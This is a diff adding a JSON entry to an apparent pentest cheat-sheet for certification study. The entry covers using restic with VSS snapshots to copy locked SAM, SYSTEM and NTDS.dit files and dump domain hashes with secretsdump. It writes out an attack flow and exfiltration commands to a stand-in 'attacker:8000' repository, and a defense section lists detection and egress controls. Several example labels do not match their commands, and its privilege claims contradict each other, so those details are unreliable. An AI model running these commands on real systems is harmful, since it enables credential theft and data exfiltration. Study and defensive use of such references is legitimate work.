@@ -1,0 +1,90 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "restic"
+  ],
+  "tags": [
+    "restic",
+    "vss",
+    "sam",
+    "hashes"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Pillaging",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Init a new restic repo",
+      "command": "mkdir E:\\restic2; restic.exe -r E:\\restic2 init"
+    },
+    {
+      "label": "Set the repo password",
+      "command": "$env:RESTIC_PASSWORD = 'Password'"
+    },
+    {
+      "label": "Back up a normal directory",
+      "command": "restic.exe -r E:\\restic2\\ backup C:\\Windows\\System32\\config --use-fs-snapshot"
+    },
+    {
+      "label": "VSS-backup the locked config directory",
+      "command": "restic.exe -r E:\\restic2\\ snapshots"
+    }
+  ],
+  "notes": "=== Restic Offensive Backup — VSS-Based File Exfiltration ===\nUse restic with VSS to back up locked files (SAM, NTDS.dit) to attacker-controlled repository.\n\n=== WHY VSS + RESTIC ===\nSAM, NTDS.dit, and other critical files are locked by the OS while running.\nrestic --use-fs-snapshot creates a VSS (Volume Shadow Copy) before backing up.\nVSS snapshot contains copies of locked files not actively held by the OS.\nResult: can back up NTDS.dit from a live DC without stopping the AD DS service.\n\n=== ATTACK FLOW ===\nStep 1: Initialize a restic repository (local or remote)\n  restic init --repo C:\\Temp\\backup_repo\n  Enter repository password when prompted\n\nStep 2: Set password environment variable (avoid interactive prompt for scripts)\n  $env:RESTIC_PASSWORD = \"backup_password\"\n\nStep 3: Create backup with VSS snapshot (captures locked files)\n  restic -r C:\\Temp\\backup_repo backup C:\\Windows\\NTDS --use-fs-snapshot\n  restic -r C:\\Temp\\backup_repo backup C:\\Windows\\System32\\config --use-fs-snapshot\n\nStep 4: List snapshots to confirm\n  restic -r C:\\Temp\\backup_repo snapshots\n\nStep 5: Restore backed-up files to accessible location\n  restic -r C:\\Temp\\backup_repo restore latest --target C:\\Temp\\restored --include C:\\Windows\\NTDS\n\nStep 6: Extract credentials offline\n  python3 secretsdump.py -ntds C:\\Temp\\restored\\Windows\\NTDS\\ntds.dit -system C:\\Temp\\restored\\Windows\\System32\\config\\SYSTEM LOCAL\n\n=== LEGITIMATE BACKUP ABUSE ===\nIf restic is already installed and configured (backup infrastructure exists):\nFind backup credentials in scripts/env vars → use existing repository → browse/restore any backup\nBackup agents typically have admin-level access to all systems they protect\n\n=== CHAINING CONTEXT ===\nRestic backup of DC → NTDS.dit + SYSTEM → secretsdump → all domain hashes → full compromise\nRestic backup to remote repo (S3, SFTP) → exfiltrate sensitive files off-network\nExisting backup server compromise → access backups from all org systems → single pivot point\n--use-fs-snapshot makes this applicable even without SeBackupPrivilege on live files",
+  "references": [
+    {
+      "title": "restic",
+      "url": "https://restic.net/"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "restic-backup-restore",
+      "note": "Restore the snapshot and extract hashes.",
+      "rel": "next"
+    }
+  ],
+  "id": "restic-offensive-backup",
+  "name": "Pillaging - restic VSS Backup of Locked Hives",
+  "command": "restic.exe -r <repo> backup C:\\Windows\\System32\\config --use-fs-snapshot",
+  "description": "restic with --use-fs-snapshot uses VSS to back up files that are normally locked - including the live SAM/SYSTEM/SECURITY registry hives - which you then restore and dump offline.",
+  "opsec": "loud",
+  "mitre": [
+    "T1003.002"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Restic supports VSS snapshots (--use-fs-snapshot) allowing backup of files locked by the OS (SAM, NTDS.dit, SYSTEM hives). By running restic from a low-privilege position with sufficient VSS rights, an attacker can exfiltrate these locked files to an attacker-controlled restic repository, then restore them offline for credential extraction.",
+    "prerequisites": "Shell access with ability to run restic. Rights to create VSS snapshots (local admin or SeBackupPrivilege may be needed). Network access to an attacker-controlled restic repository.",
+    "impact": "Exfiltration of locked system files including NTDS.dit to an attacker-controlled backup repository, enabling offline credential extraction without leaving obvious traces on the target.",
+    "detection": "restic.exe execution by non-backup user with --use-fs-snapshot flag. VSS shadow copy creation (Event 8222). Large outbound data transfer via restic. New restic repository initialization to unknown host.",
+    "artifacts": "Process: restic.exe --use-fs-snapshot backup to unknown repo | Event 8222: VSS snapshot created by non-SYSTEM process | Network: large outbound backup stream to attacker IP",
+    "prevention": "Block outbound restic connections from servers via firewall (restic uses REST API over HTTPS or SFTP). Restrict VSS creation rights. Monitor restic execution by non-backup service accounts. Apply egress filtering to prevent exfiltration to unknown hosts.",
+    "misconfiguration": "No egress filtering from servers. restic binary available in PATH. No monitoring on VSS creation by non-backup processes. Outbound HTTPS to arbitrary hosts permitted from servers.",
+    "vulnerable_config": "# Attacker exfiltrates locked files via restic backup:\nrestic.exe -r rest:http://attacker:8000/ --password-file .\\pass.txt init\nrestic.exe -r rest:http://attacker:8000/ --password-file .\\pass.txt backup C:\\Windows\\System32\\config --use-fs-snapshot\n\n# On attacker machine - restore and dump:\nrestic -r rest:http://attacker:8000/ restore latest --target .\\restore\nsecretsdump.py -sam restore\\SAM -system restore\\SYSTEM LOCAL",
+    "secure_config": "# Firewall egress filtering:\n# Block outbound TCP from servers to non-approved backup IPs\n# Allow only \\\\approved-backup-server on port 443\n\n# Restrict VSS creation:\n# Remove SeBackupPrivilege from standard users\n# Monitor: Event 8222 VSS creation by non-SYSTEM process\n\n# Restrict restic binary:\n# WDAC: only svc_backup allowed to execute restic.exe",
+    "sources": [
+      "HTB M26",
+      "MITRE T1003.003",
+      "MITRE T1048"
+    ]
+  }
+}
